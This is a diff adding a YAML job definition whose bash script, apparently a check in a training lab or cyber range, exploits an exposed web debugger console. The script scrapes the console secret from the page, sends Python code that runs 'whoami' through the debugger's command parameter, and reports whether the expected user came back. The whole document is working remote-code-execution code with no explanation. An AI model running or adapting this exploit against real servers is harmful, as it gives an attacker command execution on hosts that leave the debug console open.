@@ -1,0 +1,39 @@
+execute: remote
+script: |
+  #!/bin/bash
+
+  function getParam() {
+   if [ "$1" != "null" ]; then
+       echo $1 | cut -d\" -f 2
+   else
+       echo ""
+   fi
+  }
+
+  export http_proxy=""
+  export https_proxy=""
+
+  principal=$(getParam $1)
+  host=$(getParam $2)
+  username=$(getParam $3)
+
+  secret=$(curl -s http://127.0.0.1/console | grep -P '[0-9a-zA-Z]{20}' | cut -d\" -f 2)
+  #echo $secret
+
+  cmd="__import__('os').popen('whoami').read();"
+  sleep 1
+
+  out=""
+  declare -i ct=0
+  while [ "$out" == "" ]  && [ $ct -le 50 ]
+  do
+   out=$(wget -q -O- "http://127.0.0.1/console?__debugger__=yes&cmd=$cmd&frm=0&s=$secret")
+   out=$(echo $out | grep "'$username")
+   ct=$ct+1
+  done
+
+  if [ "$out" == "" ]; then
+     username=""
+  fi
+
+  echo -n "{\"principal\":\"$principal\", \"username\":\"$username\", \"host\":\"$host\""}
